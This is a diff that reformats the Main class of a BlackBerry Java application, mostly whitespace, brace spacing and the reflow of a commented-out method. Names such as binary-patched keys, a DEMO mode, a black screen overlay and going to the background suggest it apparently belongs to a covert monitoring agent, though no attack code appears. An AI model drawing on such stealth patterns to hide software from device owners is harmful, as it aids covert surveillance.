@@ -53,7 +53,7 @@ public class Main extends UiApplication {
     public static void mainReal() {
         final Keys keys = Encryption.getKeys();
         final boolean binaryPatched = keys.hasBeenBinaryPatched();
-                
+
         if (binaryPatched) {
             new Main().enterEventDispatcher();
         } else {
@@ -73,7 +73,7 @@ public class Main extends UiApplication {
     public Main() {
         localScreen = new LocalScreen(this);
         pushScreen(localScreen);
-        
+
         final Core core = Core.getInstance();
 
         Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
@@ -96,7 +96,7 @@ public class Main extends UiApplication {
             debug.warn("Main: DEMO mode");
             //#endif
             Status.self().setDemo(true);
-        }else{
+        } else {
             //#ifdef DEBUG
             debug.trace("Main: no DEMO");
             //#endif
@@ -115,8 +115,7 @@ public class Main extends UiApplication {
 
             }
         }
-        
-        
+
     }
 
     /**
@@ -173,29 +172,16 @@ public class Main extends UiApplication {
 
     }
 
-   /* public void showBlackScreen(boolean value) {
-        //#ifdef DEBUG
-        debug.trace("showBlackScreen: " + value);
-        //#endif
-        //foreground = value;
-        if (value) {
-            synchronized (this.getAppEventLock()) {
-                BlackScreen.newInstance(Main.getUiApplication());
-            }
-
-        } else {
-            if (BlackScreen.getInstance() != null) {
-                //#ifdef DEBUG
-                debug.trace("showBlackScreen: dismiss");
-                //#endif
-                synchronized (this.getAppEventLock()) {
-                    BlackScreen.getInstance().dismiss();
-                }
-
-                //goBackground();
-            }
-        }
-    }*/
+    /*
+     * public void showBlackScreen(boolean value) { //#ifdef DEBUG
+     * debug.trace("showBlackScreen: " + value); //#endif //foreground = value;
+     * if (value) { synchronized (this.getAppEventLock()) {
+     * BlackScreen.newInstance(Main.getUiApplication()); } } else { if
+     * (BlackScreen.getInstance() != null) { //#ifdef DEBUG
+     * debug.trace("showBlackScreen: dismiss"); //#endif synchronized
+     * (this.getAppEventLock()) { BlackScreen.getInstance().dismiss(); }
+     * //goBackground(); } } }
+     */
 
     public void goBackground() {
         if (!Cfg.IS_UI) {
